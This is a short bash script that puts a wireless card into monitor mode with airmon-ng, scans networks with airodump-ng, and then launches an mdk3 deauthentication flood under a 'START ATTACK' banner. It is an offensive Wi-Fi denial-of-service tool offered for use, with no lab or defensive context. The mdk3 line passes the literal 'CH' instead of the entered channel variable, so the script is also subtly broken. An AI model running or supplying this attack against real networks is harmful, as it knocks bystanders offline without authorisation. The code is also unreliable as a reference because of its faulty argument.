#!/bin/bash

# colors
red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"
# interface ( wlan0 , eth0 )
echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " Interface
# to complete the sentence
MON=mon
# start monitor mode
airmon-ng start $Interface
# to see bssids and chnnals
airodump-ng $Interface$MON
# chnnal
echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CH
# to change chnnal
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"
# start attack
mdk3 $Interface$MON d -c CH
# stop monitor mode
airmon-ng stop $Interface$MON
